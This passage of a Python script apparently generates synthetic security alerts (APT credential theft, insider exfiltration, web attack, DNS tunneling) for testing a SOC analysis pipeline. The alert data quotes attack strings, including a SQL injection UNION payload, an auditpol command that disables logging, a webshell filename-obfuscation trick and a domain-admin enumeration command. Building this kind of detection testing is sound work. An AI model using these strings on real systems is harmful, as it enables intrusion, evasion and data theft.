         "severity": "critical", "attack_type": "privilege_escalation",
         "hostname": "WS-HR-003", "user": "CORP\\hr.director",
         "mitre_techniques": ["T1003.003", "T1558.003"],
         "kill_chain_phase": "install",
         "indicators": ["dcsync_attack", "krbtgt_extraction", "golden_ticket_possible"],
         "correlated_cases": [ref1, ref2, ref3],
         "priv_esc": {"privilege_level_before": "user",
                      "privilege_level_after": "domain_admin",
                      "process_chain": ["explorer.exe", "mimikatz.exe"]}},
        {"vt_malicious": 0, "vt_total": 0, "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"threat_actor": "APT29", "campaign_name": campaign,
                      "mitre_ids": ["T1003.003"], "malware_families": ["Mimikatz"]}},
    ))
    return cases


def scenario_insider() -> List[tuple]:
    """Insider threat: Wazuh off-hours DB access → Arkime mega.nz upload → Wazuh audit disable."""
    cases: List[tuple] = []

    ref1 = gen_id()
    cases.append((
        wazuh_alert("60106", 10, "Off-Hours Login to Sensitive Database Server",
                    "HRDB-01", "10.0.20.15",
                    ["T1078.003", "T1530"], ["Defense Evasion", "Collection"],
                    {"user": "CORP\\mchen",
                     "sourceAddress": "73.142.89.201",
                     "logonType": "RemoteInteractive",
                     "logonTime": "03:47:12",
                     "queryExecuted": "SELECT * FROM Employees WHERE Salary IS NOT NULL"},
                    hours_ago=6),
        {"source_ref": ref1,
         "title": "Wazuh: Off-Hours DB Access + Salary Query (mchen)",
         "description": ("CORP\\mchen (DB Admin) → HRDB-01 at 03:47 via RDP from 73.142.89.201. "
                         "Typical hours: 09:00-18:00. Third off-hours access this week. "
                         "Query: SELECT * FROM Employees WHERE Salary IS NOT NULL."),
         "severity": "medium", "attack_type": "reconnaissance",
         "hostname": "HRDB-01", "user": "mchen@corp.local",
         "mitre_techniques": ["T1078.003", "T1530"],
         "kill_chain_phase": "reconnaissance",
         "indicators": ["off_hours_access", "unusual_rdp_source", "sensitive_data_query"],
         "network": {"source_ip": "73.142.89.201", "destination_ip": "10.0.20.15", "protocol": "RDP", "port": 3389}},
        {"vt_malicious": 0, "vt_total": 0, "abuse_score": 12, "abuse_reports": 3,
         "ioc_meta": {"ips": ["73.142.89.201"], "mitre_ids": ["T1078.003"]}},
    ))

    ref2 = gen_id()
    cases.append((
        arkime_session("10.0.20.15", 55234, "89.44.169.135", 443,
                       "TCP", 48318382080,
                       ["https", "mega.nz", "large-upload", "dlp-pii-exfil"],
                       hours_ago=3),
        {"source_ref": ref2,
         "title": "Arkime: 45GB Upload to Mega.nz — DLP PII Alert (mchen)",
         "description": ("Arkime: 45GB HTTPS upload HRDB-01 → mega.nz (89.44.169.135) over 3h. "
                         "DLP: PII_Exfil_High_Confidence triggered. "
                         "File: employee_data_backup.7z. Baseline: <500MB/month. "
                         "HR DB has 12,000 records with PII + salary + SSN."),
         "severity": "high", "attack_type": "data_exfiltration",
         "hostname": "HRDB-01", "user": "mchen@corp.local",
         "mitre_techniques": ["T1567.002", "T1048.003"],
         "kill_chain_phase": "exfiltration",
         "indicators": ["large_upload", "personal_cloud_storage", "dlp_triggered"],
         "network": {"source_ip": "10.0.20.15", "destination_ip": "89.44.169.135", "protocol": "HTTPS", "port": 443},
         "correlated_cases": [ref1],
         "data_exfil": {"data_volume_gb": 45, "transfer_type": "cloud_storage",
                        "data_types": ["employee_pii", "salary_data", "ssn"],
                        "encryption": "aes_256", "dlp_rule": "PII_Exfil_High_Confidence"}},
        {"vt_ioc": "89.44.169.135", "vt_type": "ip_address",
         "vt_malicious": 2, "vt_total": 68, "threat_names": [],
         "abuse_score": 18, "abuse_reports": 7,
         "ioc_meta": {"ips": ["89.44.169.135"], "mitre_ids": ["T1567.002"]}},
    ))

    cases.append((
        wazuh_alert("92300", 12, "Audit Logging Disabled on Database Server",
                    "HRDB-01", "10.0.20.15",
                    ["T1562.001", "T1070.001"], ["Defense Evasion"],
                    {"user": "CORP\\mchen",
                     "commandLine": "auditpol /set /subcategory:\"Database\" /failure:disable /success:disable",
                     "process": "auditpol.exe",
                     "parentProcess": "cmd.exe"},
                    hours_ago=2.5),
        {"source_ref": gen_id(),
         "title": "Wazuh: Audit Logging Disabled on HRDB-01 (mchen — cover tracks)",
         "description": ("CORP\\mchen disabled all DB audit logging on HRDB-01 via auditpol.exe. "
                         "Executed 2h after off-hours login. Clear intent to conceal exfiltration activity."),
         "severity": "high", "attack_type": "privilege_escalation",
         "hostname": "HRDB-01", "user": "mchen@corp.local",
         "mitre_techniques": ["T1562.001", "T1070.001"],
         "kill_chain_phase": "install",
         "indicators": ["audit_log_disabled", "privilege_abuse", "evasion"],
         "correlated_cases": [ref1, ref2],
         "priv_esc": {"privilege_level_before": "db_admin",
                      "privilege_level_after": "local_admin",
                      "process_chain": ["cmd.exe", "auditpol.exe"]}},
        {"vt_malicious": 0, "vt_total": 0, "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"mitre_ids": ["T1562.001"]}},
    ))
    return cases


def scenario_web() -> List[tuple]:
    """Web app: Suricata SQLi → Suricata webshell → Arkime DB exfil."""
    campaign = f"WEB-{uuid.uuid4().hex[:6].upper()}"
    cases: List[tuple] = []

    ref1 = gen_id()
    cases.append((
        suricata_alert(2006445, "ET WEB_SERVER SQL Injection Attempt UNION SELECT",
                       "Web Application Attack", 1,
                       "45.155.205.99", random.randint(40000, 60000),
                       "10.0.30.10", 80, hours_ago=8),
        {"source_ref": ref1,
         "title": f"Suricata: SQLi UNION SELECT on CustomerPortal [{campaign}]",
         "description": (f"SQLi on /api/v1/customers: ' UNION SELECT username,password,NULL FROM users-- "
                         f"Source: 45.155.205.99 (abuse score 97, VPS). WAF blocked — probing alternate vectors. "
                         f"Campaign: {campaign}."),
         "severity": "high", "attack_type": "reconnaissance",
         "hostname": "WEB-PROD-01",
         "mitre_techniques": ["T1190", "T1059.001"],
         "kill_chain_phase": "exploit",
         "indicators": ["sql_injection", "union_select", "known_attacker_ip"],
         "network": {"source_ip": "45.155.205.99", "destination_ip": "10.0.30.10", "protocol": "HTTP", "port": 80}},
        {"vt_ioc": "45.155.205.99", "vt_type": "ip_address",
         "vt_malicious": 61, "vt_total": 72, "threat_names": ["Scanner", "SQLi-tool"],
         "abuse_score": 97, "abuse_reports": 1243,
         "ioc_meta": {"high_risk": True, "ips": ["45.155.205.99"], "mitre_ids": ["T1190"]}},
    ))

    ref2 = gen_id()
    cases.append((
        suricata_alert(2024364, "ET WEB_SERVER WEBSHELL Generic ASPX w3wp Spawn",
                       "Web Application Attack", 1,
                       "45.155.205.99", random.randint(40000, 60000),
                       "10.0.30.10", 443, hours_ago=7),
        {"source_ref": ref2,
         "title": f"Suricata+Wazuh: ASPX Webshell Upload + IIS Execution [{campaign}]",
         "description": (f"POST /api/v1/documents/upload — ASPX webshell (YARA: WebShell_ASPX_Generic). "
                         f"WAF bypass: multipart filename obfuscation (config_handler.aspx;.jpg). "
                         f"Wazuh EDR: w3wp.exe → cmd.exe → net.exe 'Domain Admins' /domain. "
                         f"IIS execution confirmed. Campaign: {campaign}."),
         "severity": "critical", "attack_type": "malware",
         "hostname": "WEB-PROD-01",
         "mitre_techniques": ["T1505.003", "T1190", "T1059.001"],
         "kill_chain_phase": "install",
         "indicators": ["webshell_upload", "iis_execution", "waf_bypass", "ad_enumeration"],
         "network": {"source_ip": "45.155.205.99", "destination_ip": "10.0.30.10", "protocol": "HTTPS", "port": 443},
         "correlated_cases": [ref1],
         "file_analysis": {"file_name": "config_handler.aspx;.jpg",
                           "file_hash_sha256": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5",
                           "yara_rule": "WebShell_ASPX_Generic",
                           "av_detections": ["CrowdStrike", "Sophos"],
                           "process_behavior": ["w3wp.exe → cmd.exe",
                                                "net.exe 'Domain Admins' /domain"]}},
        {"vt_ioc": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5",
         "vt_type": "file", "vt_malicious": 58, "vt_total": 68,
         "threat_names": ["WebShell.ASPX", "China Chopper"],
         "abuse_score": 97, "abuse_reports": 1243,
         "ioc_meta": {"high_risk": True, "ips": ["45.155.205.99"],
                      "hashes": ["d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5"],
                      "mitre_ids": ["T1505.003"]}},
    ))

    cases.append((
        arkime_session("10.0.30.10", random.randint(40000, 60000),
                       "185.220.101.47", 443, "TCP", 2254857830,
                       ["https", "large-outbound", "dlp-critical", "database-exfil"],
                       hours_ago=5),
        {"source_ref": gen_id(),
         "title": f"Arkime: 2.1GB DB Dump → Malicious VPS [{campaign}]",
         "description": (f"2.1GB HTTP POST WEB-PROD-01 → 185.220.101.47:443 (known malicious VPS). "
                         f"Content: SQL dump pattern (CREATE TABLE, INSERT INTO pre-compression). "
                         f"DB: CustomerPortal_DB — 500k customers, PII + CC hashes. Campaign: {campaign}."),
         "severity": "critical", "attack_type": "data_exfiltration",
         "hostname": "WEB-PROD-01",
         "mitre_techniques": ["T1041", "T1048.003"],
         "kill_chain_phase": "exfiltration",
         "indicators": ["database_dump", "large_outbound", "known_malicious_ip"],
         "network": {"source_ip": "10.0.30.10", "destination_ip": "185.220.101.47", "protocol": "HTTPS", "port": 443},
         "correlated_cases": [ref1, ref2],
         "data_exfil": {"data_volume_gb": 2.1, "transfer_type": "http_post",
                        "data_types": ["customer_pii", "credit_card_hashes", "order_history"],
                        "dlp_rule": "Database_Exfil_Critical"}},
        {"vt_ioc": "185.220.101.47", "vt_type": "ip_address",
         "vt_malicious": 61, "vt_total": 68, "threat_names": ["ExfilServer"],
         "abuse_score": 99, "abuse_reports": 4512,
         "ioc_meta": {"high_risk": True, "ips": ["185.220.101.47"], "mitre_ids": ["T1041"]}},
    ))
    return cases


def scenario_dns() -> List[tuple]:
    """DNS tunneling: Arkime volume anomaly + Zeek Iodine pattern — legal workstation."""
    cases: List[tuple] = []

    ref1 = gen_id()
    cases.append((
        arkime_session("10.0.10.92", 54321, "10.0.1.1", 53,
                       "UDP", 9663676416,
                       ["dns", "txt-queries", "high-volume", "iodine-pattern"],
                       hours_ago=1),
        {"source_ref": ref1,
         "title": "Arkime: DNS TXT Query Volume Anomaly — WS-LEGAL-003",
         "description": ("Arkime: 1,200 DNS TXT queries/h from WS-LEGAL-003 (baseline 30/h). "
                         "Session volume: 9GB. Tags: iodine-pattern, high-volume. "
                         "Legal workstation holds M&A documents (sensitive)."),
         "severity": "high", "attack_type": "data_exfiltration",
         "hostname": "WS-LEGAL-003", "user": "legal.counsel@corp.local",
         "mitre_techniques": ["T1048.003", "T1071.004"],
         "kill_chain_phase": "exfiltration",
         "indicators": ["dns_volume_anomaly", "iodine_pattern"],
         "network": {"source_ip": "10.0.10.92", "destination_ip": "10.0.1.1", "protocol": "DNS", "port": 53}},
        {"vt_malicious": 0, "vt_total": 0, "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"domains": ["exfil.attacker-domain.com"], "mitre_ids": ["T1048.003"]}},
    ))

    cases.append((
        zeek_notice("DNS::Tunneling",
                    "Iodine DNS tunnel: base32 subdomains to exfil.attacker-domain.com. 1200 TXT req/h. ~8GB exfil.",
                    "10.0.10.92", "10.0.1.1", hours_ago=0.5),
        {"source_ref": gen_id(),
         "title": "Zeek: Iodine DNS Tunnel Confirmed — 8GB Legal Docs Exfil",
         "description": ("Zeek confirmed Iodine DNS tunnel from WS-LEGAL-003 → exfil.attacker-domain.com. "
                         "Base32-encoded subdomains. 8GB exfiltrated over 6h. "
                         "M&A documents, contracts at risk. DLP: Legal_Doc_Exfil_Critical."),
         "severity": "critical", "attack_type": "data_exfiltration",
         "hostname": "WS-LEGAL-003", "user": "legal.counsel@corp.local",
         "mitre_techniques": ["T1048.003", "T1071.004", "T1568.002"],
         "kill_chain_phase": "exfiltration",
         "indicators": ["dns_tunneling", "iodine_confirmed", "base32_encoding"],
         "network": {"source_ip": "10.0.10.92", "destination_ip": "10.0.1.1", "protocol": "DNS", "port": 53},
         "correlated_cases": [ref1],
         "data_exfil": {"data_volume_gb": 8, "transfer_type": "dns_tunnel",
                        "data_types": ["legal_documents", "ma_documents", "contracts"],
                        "encryption": "base32", "dlp_rule": "Legal_Doc_Exfil_Critical"}},
        {"vt_malicious": 0, "vt_total": 0, "abuse_score": 0, "abuse_reports": 0,
         "ioc_meta": {"domains": ["exfil.attacker-domain.com"], "mitre_ids": ["T1048.003"]}},
    ))
    return cases


# ── RUNNER ────────────────────────────────────────────────────────────────────

SCENARIOS = {
    "ransomware": scenario_ransomware,
    "apt":        scenario_apt,
    "insider":    scenario_insider,
    "web":        scenario_web,
    "dns":        scenario_dns,
}


async def run_simulation(scenario_names: Optional[List[str]] = None) -> List[Dict]:
    if scenario_names is None:
        scenario_names = list(SCENARIOS.keys())

    all_cases: List[tuple] = []
    for name in scenario_names:
        if name in SCENARIOS:
            batch = SCENARIOS[name]()
            all_cases.extend(batch)
            print(f"[+] Scenario '{name}': {len(batch)} alert(s)")

    print(f"\n[+] Total: {len(all_cases)} alerts")
    print(f"[+] Pipeline: Wazuh/Suricata/Arkime/Zeek → Shuffle → MISP+Cortex+OpenCTI+TheHive → NexusSOC")
    print(f"[+] Workflow: {SHUFFLE_WORKFLOW_ID}  Execution: {SHUFFLE_EXECUTION_ID}")
    print("=" * 70)

    results = []
    async with httpx.AsyncClient() as client:
        for i, (raw_alert, meta, ec) in enumerate(all_cases, 1):
            tool = raw_alert.get("_source_tool", "unknown").upper()
            print(f"\n[{i}/{len(all_cases)}] [{tool}] {meta['title'][:65]}")
            print(f"  [Shuffle] Workflow triggered — extracting IOCs + parallel enrichment")
            result = await shuffle_workflow(raw_alert, meta, ec, client)
            results.append(result)
            await asyncio.sleep(0.5)

    with open(RESULTS_FILE, "w") as f:
        json.dump({"timestamp": ts(), "workflow": SHUFFLE_WORKFLOW_ID,
                   "total": len(results),
                   "success": sum(1 for r in results if r["status"] == "success"),
                   "results": results}, f, indent=2)

    success = sum(1 for r in results if r["status"] == "success")
    print(f"\n{'=' * 70}")
    print(f"DONE: {success}/{len(results)} alerts processed by NexusSOC")
    print(f"Results → {RESULTS_FILE}")
    return results


def main():
    import argparse
    parser = argparse.ArgumentParser(description="NexusSOC Full SOC Stack Simulation")
    parser.add_argument("--scenario", nargs="+", choices=list(SCENARIOS.keys()),
                        default=None, help="Scenarios to run (default: all)")
    args = parser.parse_args()

    print("=" * 70)
    print("NEXUSSOC — FULL SOC STACK SIMULATION")
    print("Wazuh | Suricata | Arkime | Zeek")
    print("  → Shuffle: MISP + Cortex(VT+AbuseIPDB) + OpenCTI + TheHive")
    print("  → NexusSOC /analyze-case")
    print("=" * 70)
    print(f"Scenarios: {args.scenario or 'ALL'}\n")
    asyncio.run(run_simulation(args.scenario))


if __name__ == "__main__":
    main()
